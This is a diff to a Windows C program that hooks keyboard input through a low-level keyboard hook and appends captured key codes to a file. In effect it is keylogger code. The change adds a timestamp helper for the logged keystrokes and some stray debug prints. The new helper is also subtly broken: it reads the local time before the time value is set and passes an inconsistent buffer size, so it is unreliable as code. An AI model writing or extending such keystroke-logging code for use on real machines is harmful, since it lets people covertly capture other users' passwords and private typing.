@@ -1,6 +1,6 @@
 #include <stdio.h>
 #include <windows.h>
-
+#include <time.h>
 // add this line or add user32.lib on Makefile
 //#pragma comment(lib, "user32.lib")
 
@@ -15,6 +15,27 @@ typedef struct tagKBDLLHOOKSTRUCT {
 
 https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
 */
+
+char    *GetMyLocalTime(void)
+{
+    time_t  t = 0;
+    size_t  size = 0;
+    struct  tm tm_info;
+    char    *buffer = NULL;
+
+    localtime_s(&tm_info, &t);
+    t = time(NULL);
+    size = strftime(NULL, 0, "[%d.%m.%Y %H:%M:%S]", &tm_info);
+    printf("time = %zu\n", size);
+
+    buffer = malloc(sizeof(char *) * size + 1);
+    if (!buffer)
+        return (NULL);
+
+    strftime(buffer, size, "[%d.%m.%Y %H:%M:%S]", &tm_info);
+
+    return (buffer);
+}
 
 LRESULT CALLBACK hook_proc(int code, WPARAM wParam, LPARAM lParam)
 {
@@ -66,7 +87,13 @@ LRESULT CALLBACK hook_proc(int code, WPARAM wParam, LPARAM lParam)
                     printf("CreateFile error: %lu\n", GetLastError());
                     // return NULL;
                 }
-            
+                printf("bonjour");
+
+                char *time = GetMyLocalTime();
+                printf("bonjour");
+                printf("%s\n", time);
+                if (time)
+                    free(time);
                 SetFilePointer(hFile, 0, NULL, FILE_END);
 
                 char    c = (char)pkey->vkCode;
